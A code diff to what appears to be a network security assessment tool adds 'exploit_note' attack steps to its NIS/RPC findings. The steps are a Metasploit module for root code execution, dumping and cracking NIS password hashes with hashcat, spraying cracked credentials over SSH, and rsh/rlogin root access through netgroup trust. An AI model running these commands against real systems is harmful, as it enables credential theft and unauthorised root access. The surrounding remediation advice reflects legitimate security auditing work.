@@ -713,7 +713,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"rpcinfo -p {h.ip}   # confirm 100028 and its port",
                 "Disable rpc.ypupdated. There is no non-EOL fix on the affected "
                 "SunOS/Solaris releases.",
-                ["CWE-77", "CWE-306"], kind="nis_ypupdated"))
+                ["CWE-77", "CWE-306"], kind="nis_ypupdated",
+                exploit_note=(
+                    "rpcinfo -p <ip>; MSF exploit/solaris/misc/ypupdated_exec "
+                    "target=<ip> — RCE as root on SunOS 4.x/Solaris 2.x; "
+                    "ONLY IN LAB."
+                ),
+                depth_tier="t0"))
 
         domain = pr.get("domain") or ""
         maps = pr.get("maps") or []
@@ -758,7 +764,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "Migrate off NIS; if that is not immediate, restrict ypserv to "
                 "management subnets via /var/yp/securenets and expire every "
                 "account whose hash was in the dump.",
-                ["CWE-522", "CWE-256", "CWE-319"], kind="nis_passwd_hashes"))
+                ["CWE-522", "CWE-256", "CWE-319"], kind="nis_passwd_hashes",
+                exploit_note=(
+                    "ypcat -d <domain> -h <ip> passwd > loot/nis.pw; hashcat "
+                    "-m 1500 (DES) / -m 500 (md5crypt) / -m 7400 (sha256crypt) "
+                    "/ -m 1800 (sha512crypt) loot/nis.pw rockyou.txt; nxc ssh "
+                    "<estate_ips> -u loot/users.txt -p loot/cracked.txt."
+                ),
+                depth_tier="t3"))
             if has_des:
                 out.append(_finding(
                     "medium",
@@ -790,7 +803,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "ypcat",
                 f"ypcat -d {domain} -h {h.ip} group",
                 "Restrict ypserv (securenets) or migrate off NIS.",
-                ["CWE-522", "CWE-732"], kind="nis_group_hashes"))
+                ["CWE-522", "CWE-732"], kind="nis_group_hashes",
+                exploit_note=(
+                    "ypcat -d <domain> -h <ip> group | grep -E "
+                    "'^(wheel|sudo|adm|root):'; then hashcat prioritized on "
+                    "those users' hashes."
+                ) if priv_groups else "",
+                depth_tier="t1" if priv_groups else ""))
 
         netgroup_recs = (pr.get("records") or {}).get("netgroup", [])
         trust_hits = [(k, v) for k, v in netgroup_recs
@@ -808,7 +827,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"ypcat -d {domain} -h {h.ip} netgroup",
                 "Audit /etc/exports / /etc/hosts.equiv / .rhosts users of the "
                 "leaked netgroups; migrate off NIS trust.",
-                ["CWE-284", "CWE-269"], kind="nis_netgroup_trust"))
+                ["CWE-284", "CWE-269"], kind="nis_netgroup_trust",
+                exploit_note=(
+                    "For each netgroup granting root/-: rlogin -l root "
+                    "<host_in_netgroup>; rsh <host_in_netgroup> 'id'  # if "
+                    "trust wired via .rhosts/hosts.equiv this returns a shell."
+                ) if trust_hits else "",
+                depth_tier="t1" if trust_hits else ""))
 
         # Topology leak.
         topo_recs: list[str] = []
